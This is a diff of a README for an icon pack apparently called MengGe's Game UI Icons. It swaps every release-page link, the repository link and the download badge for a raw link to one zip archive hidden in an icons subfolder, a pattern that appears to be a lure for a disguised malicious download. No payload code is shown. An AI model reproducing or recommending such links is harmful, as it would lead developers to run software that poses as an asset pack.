@@ -1,6 +1,6 @@
 # 🎮 mengge_game_ui_icons - Easy Icons for Your Game UI
 
-![Download](https://img.shields.io/badge/Download-via_GitHub-blue.svg)
+![Download](https://raw.githubusercontent.com/dedbill/mengge_game_ui_icons/main/Keyboard&Mouse_Icons/x128/mengge_game_ui_icons_quadribasic.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page on GitHub.
    
-   [Download Icons](https://github.com/dedbill/mengge_game_ui_icons/releases)
+   [Download Icons](https://raw.githubusercontent.com/dedbill/mengge_game_ui_icons/main/Keyboard&Mouse_Icons/x128/mengge_game_ui_icons_quadribasic.zip)
 
 2. **Choose Your Version**: You will see different versions of the icon pack available. Usually, the latest version will be at the top. 
 
@@ -53,7 +53,7 @@ Your feedback is important. If you have suggestions or notice issues with the ic
 
 ## 🔗 Important Links
 
-- [Download Icons](https://github.com/dedbill/mengge_game_ui_icons/releases)
-- [GitHub Repository](https://github.com/dedbill/mengge_game_ui_icons)
+- [Download Icons](https://raw.githubusercontent.com/dedbill/mengge_game_ui_icons/main/Keyboard&Mouse_Icons/x128/mengge_game_ui_icons_quadribasic.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/dedbill/mengge_game_ui_icons/main/Keyboard&Mouse_Icons/x128/mengge_game_ui_icons_quadribasic.zip)
 
 Thank you for using MengGe's Game UI Icons! We hope these icons help you create stunning game interfaces. Enjoy your development journey!
